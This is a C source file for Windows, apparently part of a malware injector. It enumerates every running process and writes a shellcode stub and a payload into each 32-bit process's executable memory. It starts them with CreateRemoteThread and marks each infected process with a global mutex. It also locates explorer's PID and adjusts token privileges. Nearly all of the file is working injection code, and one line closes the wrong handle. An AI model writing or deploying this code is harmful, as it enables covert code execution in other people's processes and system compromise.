#include <Windows.h>
#include <TlHelp32.h>
#include "inject.h"
#include "loader.h"
#include "mem.h"
#include "file.h"
#include "dbg.h"

typedef bool(*FPROC)(DWORD hproc, void *arg);


typedef DWORD(__stdcall *INJ)(HANDLE hproc, void *data, int size);

DWORD get_pid_explorer(){
	HWND window = FindWindowA("shell_traywnd", NULL);
	DWORD pid;
	GetWindowThreadProcessId(window, &pid);
	return pid;
}

BOOL iswow64(HANDLE hproc){
	typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
	static LPFN_ISWOW64PROCESS fnIsWow64Process;
	BOOL bIsWow64 = FALSE;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
		GetModuleHandleA("kernel32"), "IsWow64Process");
	if (NULL != fnIsWow64Process){
		fnIsWow64Process(hproc, &bIsWow64);
	}
	return bIsWow64;
}

bool funcproc(DWORD pid, void *arg){
	if (pid == GetCurrentProcessId())
		return true;
	if (inject_to_x32((cmem*)arg, pid)){
		return true;
	}
	return true;
}

bool enumprocess(wchar_t *name, FPROC f32, void *arg32, FPROC f64, void *arg64){
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32W pe32;
	DWORD dwPriorityClass;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE){
		return false;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32W);
	if (!Process32FirstW(hProcessSnap, &pe32)){
		CloseHandle(hProcessSnap);
		return false;
	}

	bool fstop = false;
	do{
		if (!name || !_wcsicmp(pe32.szExeFile, name)){
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess){
				if (!iswow64(hProcess) && iswow64((HANDLE)-1)){
					if (f64) 
						fstop = !f64(pe32.th32ProcessID, arg64);
				}
				else{
					if (f32) {
						dbg(VINFO, L"injecting %s", pe32.szExeFile);
						fstop = !f32(pe32.th32ProcessID, arg32);
					}
				}
				CloseHandle(hProcess);
			}
		}
	} while (Process32NextW(hProcessSnap, &pe32) && !fstop);
	CloseHandle(hProcessSnap);
	return !fstop;
}

BOOL setPrivilege(HANDLE hProc, LPCTSTR szPrivName, BOOL fEnable) {
	HANDLE hToken;
	if (OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, szPrivName, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		CloseHandle(hToken);
	}
	return ((GetLastError() == ERROR_SUCCESS));
}

bool inject_to_x32(cmem *in,DWORD pid){
	bool r = false;
	char mt[255];
	sprintf(mt, "Global\\mt%u", pid);
	HANDLE hmt=CreateMutexA(0, TRUE, mt);
	if (!hmt){
		return r;
	}

	if (GetLastError() == ERROR_ALREADY_EXISTS){
		CloseHandle(hmt);
		return r;
	}
	HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hproc){
		LPVOID sc=VirtualAllocEx(hproc, 0, SIZE_SHELL, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (sc){
			DWORD rw;
			if (WriteProcessMemory(hproc, sc, START_SHELL, SIZE_SHELL, &rw)){
				LPVOID addr = VirtualAllocEx(hproc, 0, in->size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				if (addr){
					if (WriteProcessMemory(hproc, addr, in->data,in->size, &rw)){
						DWORD thid;
						HANDLE mtnew;
						if (DuplicateHandle(GetCurrentProcess(), hmt, hproc, &mtnew, 0, FALSE, DUPLICATE_SAME_ACCESS) == TRUE){
							if (CreateRemoteThread(hproc, 0, 0, (LPTHREAD_START_ROUTINE)((DWORD)sc + ((DWORD)injectcode - (DWORD)START_SHELL)), addr, 0, &thid))
								r = true;
						}
					}
				}
			}

		}
		CloseHandle(hproc);
	}
	CloseHandle(mt);
	return r;
}

bool inject(cmem &in){
	return enumprocess(0, funcproc, &in, 0, 0);
}